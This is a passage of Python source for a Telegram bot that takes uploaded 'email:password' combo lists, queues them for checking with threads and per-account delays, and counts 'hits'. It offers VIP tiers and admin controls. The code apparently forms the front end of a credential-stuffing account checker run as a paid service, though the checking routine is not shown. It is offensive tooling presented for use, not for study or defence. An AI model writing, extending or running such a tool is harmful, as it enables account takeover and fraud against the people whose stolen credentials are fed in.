    level_names = {0: "👤 Normal", 1: "⭐ VIP", 2: "👑 VIP+"}
    daily_files = user['daily_stats']['files_uploaded']
    daily_limit = DAILY_FILE_LIMITS[user['vip_level']]
    limit_text = f"{daily_files}/{daily_limit if daily_limit < 9999 else '∞'}"
    
    await update.message.reply_text(
        f"📊 *Your Statistics*\n\n"
        f"**Level:** {level_names[user['vip_level']]}\n"
        f"**Today's files:** {limit_text}\n"
        f"**Total jobs:** {user['total_jobs']}\n"
        f"**Total hits:** {user['total_hits']}",
        parse_mode=ParseMode.MARKDOWN
    )

async def setlevel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin command only.")
        return
    
    try:
        target_id = int(context.args[0])
        level = int(context.args[1])
        if level not in (0, 1, 2):
            await update.message.reply_text("Level must be 0, 1, or 2.")
            return
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /setlevel <user_id> <0|1|2>")
        return
    
    update_user(target_id, {"vip_level": level})
    await update.message.reply_text(f"✅ User {target_id} level set to {level}")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    job = user_jobs.get(user_id)
    if job and job.status == "running":
        job.cancel_event.set()
        await update.message.reply_text("⏹️ Cancelling your job...")
    else:
        await update.message.reply_text("You have no active job.")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    user = get_user(user_id)
    
    vip_level = user.get("vip_level", 0)
    max_file_size = FILE_SIZE_LIMITS.get(vip_level, FILE_SIZE_LIMITS[0])
    daily_limit = DAILY_FILE_LIMITS.get(vip_level, DAILY_FILE_LIMITS[0])
    daily_uploaded = user['daily_stats']['files_uploaded']
    
    if daily_uploaded >= daily_limit:
        await update.message.reply_text(
            f"❌ Daily limit reached: {daily_limit} files.\n"
            f"Try again tomorrow or upgrade to VIP."
        )
        return
    
    file = await update.message.document.get_file()
    if file.file_size > max_file_size:
        mb_limit = max_file_size / (1024*1024)
        await update.message.reply_text(f"❌ Max file size: {mb_limit:.0f} MB for your level.")
        return
    
    if user_id in user_jobs and user_jobs[user_id].status in ("queued", "running"):
        await update.message.reply_text("You already have a job in progress. Use /cancel first.")
        return
    
    file_bytes = await file.download_as_bytearray()
    content = file_bytes.decode('utf-8', errors='ignore')
    
    combo_list = []
    for line in content.splitlines():
        line = line.strip()
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                combo_list.append((parts[0].strip(), parts[1].strip()))
    
    if not combo_list:
        await update.message.reply_text("No valid email:password lines found.")
        return
    
    increment_daily_file_count(user_id)
    update_user(user_id, {"total_jobs": user['total_jobs'] + 1})
    
    filename = update.message.document.file_name or "uploaded.txt"
    priority = 0 if vip_level > 0 else 1
    job = Job(user_id, chat_id, combo_list, filename, priority=priority)
    user_jobs[user_id] = job
    
    await job_queue.put(job)
    
    await update.message.reply_text(
        f"📥 {len(combo_list)} accounts added to queue.\n"
        f"Queue position: {job_queue.qsize()}"
    )

# ================= POST INIT =================
async def post_init(app: Application):
    asyncio.create_task(daily_reset_check())
    asyncio.create_task(queue_worker(app.bot))

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.post_init = post_init
    
    # User commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("cancel", cancel))
    
    # Admin commands
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("setlevel", setlevel))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))
    
    # File handler
    app.add_handler(MessageHandler(filters.Document.TEXT, handle_file))
    
    print("🚀 Bot starting... (OPTIMIZED VERSION WITH ADMIN PANEL)")
    print(f"⚙️ Threads: {THREADS_PER_JOB}, Delay: {ACCOUNT_DELAY}s")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    app.run_polling()

if __name__ == "__main__":
    Path(RESULT_BASE_DIR).mkdir(exist_ok=True)
    main()